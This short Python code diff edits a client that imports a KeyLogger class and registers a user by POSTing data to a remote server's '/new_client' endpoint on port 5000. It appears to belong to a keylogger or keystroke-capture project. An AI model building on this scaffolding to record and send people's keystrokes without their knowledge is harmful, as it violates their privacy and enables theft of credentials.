@@ -1,7 +1,7 @@
 import requests
 import sys
 
-from keystroke.keylogger import KeyLogger
+from keylogger import KeyLogger
 
 def is_registred(user):
     user
@@ -9,7 +9,7 @@ def is_registred(user):
 def registration(server_url, user):
     keylogger = KeyLogger(user)
     registration_data = keylogger.registration()
-    answer = requests.post(server_url+':5000/new_client', data={'user':user}, json=registration_data).json()
+    answer = requests.post(server_url+':5000/new_client', json=registration_data).json()
     if answer['status'] == 'Successfully':
         print('[+] Регистрация прошла успешно')
 
